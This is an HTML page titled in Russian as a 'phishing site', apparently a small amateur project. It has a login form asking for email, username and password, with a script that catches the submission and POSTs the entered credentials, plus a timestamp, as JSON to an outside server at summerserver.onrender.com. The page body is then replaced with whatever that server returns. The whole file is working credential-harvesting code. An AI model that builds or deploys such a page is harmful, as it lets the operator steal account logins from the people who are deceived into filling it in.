<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=, initial-scale=1.0">
    <title>фишинговый сайт</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <form action="" id="loginForm">
        <input type="email" placeholder="введите почту" id="email">
        <input type="text" name="" id="username"plaseholder="ввидите логин">
        <input type="password" name="" id="password"plaseholder="ввидите пароль">
        <input type="checkbox" name="" >
        <p>запомнить меня</p>
        <input type="submit" value="отправить">
    </form>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                email: document.getElementById('email').value,
                date: new Date().toLocaleString()
            };

            // Отправляем данные на сервер
            const response = await fetch('https://summerserver.onrender.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            const result = await response.text();
            document.body.innerHTML = result;
        });
    </script>
</body>
</html>
